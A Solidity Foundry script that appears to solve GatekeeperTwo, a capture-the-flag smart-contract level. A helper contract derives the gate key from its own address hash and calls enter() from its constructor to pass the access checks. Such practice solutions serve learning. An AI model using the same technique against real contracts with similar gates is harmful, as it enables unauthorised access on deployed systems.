// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GatekeeperTwo.sol";


contract ata
{
    GatekeeperTwo public Two = GatekeeperTwo(0x233e18F4170Afe214014661ad196A77A7DF67eB1);

    bytes8 public gatekey;
    bytes8 public opp =bytes8(keccak256(abi.encodePacked(this)));

    constructor()
    {
        gatekey = ~opp;
        Two.enter(gatekey);
    }

}

contract Level14Solution is Script{

GatekeeperTwo public Two = GatekeeperTwo(0x233e18F4170Afe214014661ad196A77A7DF67eB1);

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("entrant:", Two.entrant());
        new ata();
        console.log("entrant:", Two.entrant());

        vm.stopBroadcast();
    }

}
